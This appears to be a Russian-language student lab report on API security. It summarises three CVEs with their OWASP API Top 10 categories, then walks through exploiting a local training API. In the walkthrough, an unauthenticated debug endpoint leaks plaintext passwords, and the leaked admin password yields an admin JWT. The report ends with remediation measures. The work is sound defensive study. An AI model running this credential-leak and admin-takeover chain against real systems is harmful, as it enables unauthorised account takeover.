1. CVE-2025-67259 - ClassroomIO REST/PostgREST Broken Access Control

Источник: https://nvd.nist.gov/vuln/detail/CVE-2025-67259

Дата публикации NVD: 24.04.2026

Суть уязвимости:

В ClassroomIO v0.1.13 низкопривилегированный пользователь с ролью student мог получить не предназначенную ему информацию о курсах через API. Для этого было достаточно изменить перехваченный API-запрос: вместо исходного запроса отправить GET к endpoint /rest/v1/course. В результате раскрывались сведения о других студентах, профили tutor/admin и внутренние метаданные курса.

Причина:

Недостаточная проверка прав доступа на уровне объектов и endpoint-метода. Сервер доверял тому, что клиент обращается к допустимой операции, и не проверял, имеет ли конкретный пользователь право видеть конкретные объекты и поля.

Связь с OWASP API Top 10:

API1:2023 - Broken Object Level Authorization, потому что пользователь получал доступ к объектам, которые ему не принадлежат.

Также близко к API3:2023 - Broken Object Property Level Authorization, потому что раскрывались чувствительные поля объектов.

2. CVE-2025-56449 - Obsidian Scheduler REST API MFA bypass

Источник: https://nvd.nist.gov/vuln/detail/CVE-2025-56449

Дата публикации NVD: 29.09.2025

Суть уязвимости:

В Obsidian Scheduler REST API версий 5.0.0 - 6.3.0 учетная запись, заблокированная из-за невключенной MFA, все равно могла использовать Basic Authentication через REST API. В частности, default admin был заблокирован в web-интерфейсе, но через REST API оставался пригодным для административных действий, включая создание нового привилегированного пользователя.

Причина:

Политика аутентификации и MFA применялась не единообразно. Web-интерфейс учитывал состояние MFA/lockout, а REST API позволял обходить это ограничение через Basic Authentication.

Связь с OWASP API Top 10:

API2:2023 - Broken Authentication, потому что API позволял обходить MFA и состояние блокировки.

Также есть связь с API5:2023 - Broken Function Level Authorization, так как через API становились доступны административные действия.

3. CVE-2025-9209 - RestroPress WordPress REST API token exposure

Источник: https://nvd.nist.gov/vuln/detail/CVE-2025-9209

Дата публикации NVD: 03.10.2025

Суть уязвимости:

Плагин RestroPress - Online Food Ordering System для WordPress версий 3.0.0 - 3.1.9.2 раскрывал приватные пользовательские токены и API-данные через REST endpoint /wp-json/wp/v2/users. Неаутентифицированный атакующий мог получить эти данные, подделать JWT для других пользователей, включая администраторов, и войти от их имени.

Причина:

REST endpoint возвращал чувствительные свойства пользовательского объекта неавторизованному клиенту. Дополнительно дизайн токенов позволял использовать утекшие значения для подделки JWT.

Связь с OWASP API Top 10:

API3:2023 - Broken Object Property Level Authorization, потому что API раскрывал свойства объекта пользователя, которые нельзя отдавать клиенту.

API2:2023 - Broken Authentication, потому что раскрытие токенов приводило к обходу аутентификации и захвату учетных записей.

2. Доступный функционал приложения

Главная страница API возвращает список доступных endpoint:

GET /

Основные endpoint:

/createdb - создать/наполнить базу

/users/v1 - посмотреть информацию обо всех пользователях

/users/v1/_debug - посмотреть подробную информацию обо всех пользователях

/users/v1/register - регистрация нового пользователя, HTTP POST

/users/v1/login - вход в приложение, HTTP POST

/users/v1/{username} - просмотр пользователя по имени

/users/v1/{username} - удалить пользователя по имени, HTTP DELETE, заявлено как доступное только администраторам

/users/v1/{username}/email - изменить email пользователя, HTTP PUT

/users/v1/{username}/password - изменить пароль пользователя, HTTP PUT

/books/v1 - все книги

/books/v1 - добавить книгу, HTTP POST

/books/v1/{book} - просмотр книги

3. Ход рассуждений и проверок

Шаг 1. Проверил обычный список пользователей:

curl -i http://localhost:8081/users/v1

Ответ:

HTTP 200

{"users":[{"email":"mail1@mail.com","username":"name1"},{"email":"mail2@mail.com","username":"name2"},{"email":"admin@mail.com","username":"admin"}]}

Вывод:

Endpoint доступен без аутентификации и раскрывает username/email. Пароли и роли в этом ответе не отображаются.

Шаг 2. Проверил endpoint с говорящим именем _debug:

curl -i http://localhost:8081/users/v1/_debug

Ответ:

HTTP 200

{"users":[{"admin":false,"email":"mail1@mail.com","password":"pass1","username":"name1"},{"admin":false,"email":"mail2@mail.com","password":"pass2","username":"name2"},{"admin":true,"email":"admin@mail.com","password":"pass1","username":"admin"}]}

Вывод:

Endpoint /users/v1/_debug доступен без токена и возвращает расширенные свойства объектов пользователей: password и admin. Это уже является утечкой чувствительных данных и нарушением авторизации на уровне свойств объекта.

Шаг 3. Проверил, можно ли использовать утекшие учетные данные администратора для входа:

Invoke-WebRequest -Method Post -Uri http://localhost:8081/users/v1/login -ContentType application/json -Body '{"username":"admin","password":"pass1"}'

Ответ:

HTTP 200

{

"auth_token": "<JWT>",

"message": "Successfully logged in.",

"status": "success"

}

Шаг 4. Декодировал payload полученного JWT без проверки подписи, чтобы убедиться, что токен действительно выдан для администратора:

Payload:

{"exp":1777576505,"iat":1777576445,"sub":"admin"}

Вывод:

Цепочка атаки подтверждена:

1. Неаутентифицированный пользователь вызывает /users/v1/_debug.

2. Получает пароль администратора admin/pass1.

3. Выполняет login под admin.

4. Получает JWT с subject admin.

5. После этого атакующий потенциально может использовать админские функции API.

Удаление пользователей через DELETE не выполнялось, чтобы не менять состояние стенда разрушительным действием. Для доказательства уязвимости достаточно получения admin JWT на основе утекшего пароля.

4. Описание найденной уязвимости

Найденная уязвимость: публично доступный debug endpoint раскрывает чувствительные свойства пользовательских объектов.

Уязвимый endpoint:

GET /users/v1/_debug

Проблемы:

1. Endpoint доступен без аутентификации.

2. Endpoint возвращает поле password для всех пользователей.

3. Endpoint возвращает поле admin, то есть раскрывает сведения о ролях.

4. Пароли хранятся и возвращаются в открытом виде.

5. Утекший пароль администратора позволяет пройти обычную аутентификацию и получить JWT администратора.

Практическое влияние:

Неаутентифицированный атакующий получает учетные данные пользователей, включая администратора. Это ведет к захвату учетной записи администратора и дальнейшему доступу к административным функциям API.

5. Тип недостатка по OWASP API Top 10

Основной тип:

API3:2023 - Broken Object Property Level Authorization.

Обоснование:

API возвращает свойства объекта пользователя, которые не должны быть доступны клиенту: password и admin. Сервер не фильтрует чувствительные поля в зависимости от роли и контекста запроса.

Дополнительные связанные типы:

API9:2023 - Improper Inventory Management, потому что debug endpoint присутствует и доступен в работающем приложении.

API2:2023 - Broken Authentication, потому что раскрытие пароля администратора приводит к обходу аутентификации через компрометацию учетных данных.

6. Меры предотвращения

1. Удалить debug endpoint из production-сборки или закрыть его feature flag, доступным только в локальной разработке.

2. Ввести принцип deny by default: каждый endpoint должен требовать явного решения по аутентификации и авторизации.

3. Проверять права доступа на уровне endpoint, объекта и отдельных свойств объекта.

4. Использовать отдельные response DTO/schema для публичных ответов API. В такие DTO никогда не должны попадать password, password_hash, токены, внутренние роли и служебные признаки.

5. Не хранить пароли в открытом виде. Использовать стойкое хеширование паролей: Argon2id, bcrypt или scrypt с солью и корректными параметрами сложности.

6. Никогда не возвращать пароли, хеши паролей, refresh/access tokens и внутренние секреты в API-ответах.

7. Ограничить административные endpoint RBAC/ABAC-проверками на сервере, а не только на уровне UI.

8. Вести инвентаризацию API endpoint и отдельно проверять, что debug/test/internal routes не доступны извне.

9. Добавить автотесты безопасности:

- неаутентифицированный пользователь не может вызывать debug/internal endpoint;

- обычный пользователь не получает поля password/admin;

- OpenAPI-схема публичных ответов не содержит секретных свойств.

10. Добавить DAST/API security scanning в CI/CD и проверять ответы API на утечки чувствительных полей.
